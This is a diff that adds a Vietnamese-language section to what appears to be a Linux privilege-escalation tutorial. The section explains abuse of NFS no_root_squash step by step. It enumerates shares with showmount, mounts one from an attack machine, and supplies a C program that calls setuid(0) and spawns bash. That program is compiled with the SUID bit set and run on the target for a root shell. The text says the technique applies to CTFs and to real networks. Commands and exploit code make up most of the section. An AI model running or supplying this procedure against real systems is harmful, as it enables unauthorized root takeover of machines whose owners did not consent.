@@ -228,3 +228,61 @@ Bước 3: Đăng nhập và chiếm quyền
 Sau khi lưu tệp, chỉ cần chuyển sang người dùng vừa tạo:
 su newroot
 Gõ mật khẩu ông đã thiết lập, và bùm... ông đã là root.
+
+**Leo thang đặc quyền qua NFS (Chia sẻ tệp qua mạng)**
+
+Các vector leo thang đặc quyền không chỉ giới hạn ở việc truy cập nội bộ. Các thư mục chia sẻ và giao diện quản lý từ xa như SSH hay Telnet cũng có thể giúp ông chiếm quyền root.
+
+Trong một số trường hợp, ông cần kết hợp cả hai: ví dụ, tìm thấy một SSH private key của root trên máy mục tiêu, sau đó dùng nó để kết nối SSH thẳng với tư cách root thay vì cố gắng leo thang từ người dùng hiện tại.
+
+Một vector khác thường xuất hiện trong các bài thi CTF và thực tế (đặc biệt là ở các hệ thống backup mạng) là cấu hình sai Network Shell.
+
+**1. File cấu hình NFS: /etc/exports**
+
+Cấu hình của NFS được lưu tại file /etc/exports. File này được tạo khi cài đặt NFS server và thường thì mọi người dùng đều có quyền đọc.
+
+**2. "Chìa khóa vàng": Tùy chọn no_root_squash**
+
+Đây là yếu tố then chốt. Theo mặc định, NFS sẽ áp dụng cơ chế "root squashing" – tức là biến người dùng root từ máy khách thành user nfsnobody trên máy chủ để bảo mật.
+
+Tuy nhiên, nếu tùy chọn no_root_squash xuất hiện trên một thư mục chia sẻ có quyền ghi (writable share), hệ thống sẽ giữ nguyên quyền root của ông khi ông thao tác trên thư mục đó từ máy khách.
+
+**3. Quy trình khai thác (Từng bước một)**
+
+Bước 1: Liệt kê các thư mục chia sẻ (Enumeration)
+Từ máy tấn công (Kali Linux), ông dùng lệnh sau để xem máy mục tiêu đang chia sẻ những gì:
+showmount -e [IP_Mục_Tiêu]
+
+Bước 2: Gắn (Mount) thư mục đó vào máy của ông
+Sau khi thấy một thư mục có no_root_squash, ông gắn nó vào một thư mục tạm trên máy mình:
+mount -t nfs [IP_Mục_Tiêu]:/tmp /tmp/mount_point
+
+Bước 3: Chế tạo "vũ khí" SUID
+Vì ông đang có quyền root trên máy tấn công và NFS cho phép no_root_squash, bất cứ file nào ông tạo ra trong thư mục mount đó với quyền root sẽ giữ nguyên quyền root trên máy mục tiêu.
+
+Ông viết một đoạn code C đơn giản (nfs.c) để mở bash shell:
+
+C
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+    return 0;
+}.
+Bước 4: Biên dịch và thiết lập SUID.
+Ông biên dịch ngay trên máy của mình (hoặc máy mục tiêu nếu có gcc) và quan trọng nhất là lệnh này:
+
+Bash
+gcc nfs.c -o nfs
+chmod +s nfs
+
+Bước 5: Kích hoạt trên máy mục tiêu.
+Bây giờ, ông quay lại cửa sổ terminal của máy mục tiêu (user quèn). Ông vào thư mục chia sẻ đó, ông sẽ thấy file nfs đã nằm ở đó sẵn rồi (vì là thư mục chung mà).
+
+Chỉ cần gõ: ./nfs  
+
+Bùm! Vì file đó có bit SUID root do chính ông thiết lập từ máy tấn công, nó sẽ mở ra một shell với quyền root trên máy mục tiêu.
